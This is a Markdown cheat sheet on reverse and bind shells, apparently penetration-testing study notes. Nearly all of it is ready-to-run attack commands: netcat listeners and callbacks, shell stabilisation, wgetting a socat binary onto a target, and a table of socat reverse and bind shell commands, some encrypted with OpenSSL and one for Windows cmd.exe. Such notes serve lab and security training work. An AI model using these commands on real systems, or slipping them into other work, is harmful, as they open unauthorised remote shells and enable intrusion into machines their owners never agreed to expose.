# Reverse / Bind Shells

> Super useful site: https://www.revshells.com/

| Reverse Shells | Bind Shells |
| -- | -- |
| When the target is forced to execute code that connects back to your computer. | When the code executed on the target is used to start a listener attached to a shell directly on the target. |

# Tools

## Netcat

Starting a listener: `sudo nc -lvnp <PORT>`

> Tip: Choose a port less than 1024 and one that is likely to be open. Ports below 1024 require `sudo`.

One way of executing a shell is by simply connecting back via an outbound connection from the target machine: `nc <TARGET-IP> <CHOSEN-PORT>`

From there, we can stabilise our shell.

### Stabilisation

1. `python(2/3) -c 'import pty;pty.spawn("/bin/bash")'`
2. `export TERM=xterm` - gives access to extra utility commands like `clear`
3. Ctrl+Z
3. `stty raw -echo; fg` - gives access to tab autocompletes, arrow keys, and Ctrl+C

When finished: `reset` to restore input visibility in your own terminal.

---

To simplify the above process, you can use `rlwrap`. 
Start a listener via: `rlwrap nc -lvnp <PORT>` and connect back.

---

For a reverse shell, use *socat*.
For a bind shell:

1. Use netcat to gain access to an unstable shell.
2. Obtain *socat static compiled binary* by runing `sudo python3 -m http.server 80` on the attacking machine, wget the binary using `wget <LOCAL-IP>/socat -O <DIR_WITH_BINARY>`.
3. Reconnect using socat.


### Socat

| Encrypted (Y/N) | Shell Type (R/B) | Command Type |
| -- | -- | -- |
| N | R | Listener (local) - `socat TCP-L:<PORT> FILE:``tty``,raw,echo=0` |
| N | R | Connector (remote) - `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane` |
| N | B | Connector (local) - `socat TCP:<TARGET-IP>:<TARGET-PORT> -` |
| N | B | Listener (remote) - `socat TCP-L:<PORT> FILE:``tty``,raw,echo=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane` or if *Windows* victim, then `socat -d -d TCP-L:<PORT> EXEC:'cmd.exe',pipes` |
| Y | R | Listener (local) - `socat OPENSSL-LISTEN:<PORT>,cert=<certname>.pem,verify=0 file=``tty``,raw,echo=0` |
| Y | R | Connector (remote) - `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC="bash -li",pty,stderr,sigint,setsid,sane` |
| Y | B | Connector (local) - `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -` |
| Y | B | Listener (remote) - `socat OPENSSL-LISTEN:<PORT>,cert=<certname>.pem,verify=0 FILE=``tty``,raw,echo=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane` |


For encrypted shells, you must create a self-signed certificate using: `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt` then combine them using: `cat shell.key shell.crt > shell.pem`.

